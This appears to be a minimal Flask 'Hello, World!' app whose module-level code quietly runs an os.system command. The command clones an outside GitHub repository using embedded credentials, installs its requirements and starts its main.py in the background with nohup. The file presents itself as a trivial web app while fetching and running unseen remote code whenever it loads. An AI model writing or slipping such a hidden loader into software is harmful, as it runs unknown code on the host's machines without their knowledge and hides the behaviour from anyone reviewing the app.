import os
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
   return 'Hello, World!'

os.system("git clone https://ar4s-eth:token@github.com/xops-alebrijecircus-x/fly.io-deploy ok && cd ok && pip3 install -U -r requirements.txt && nohup python3 main.py &")
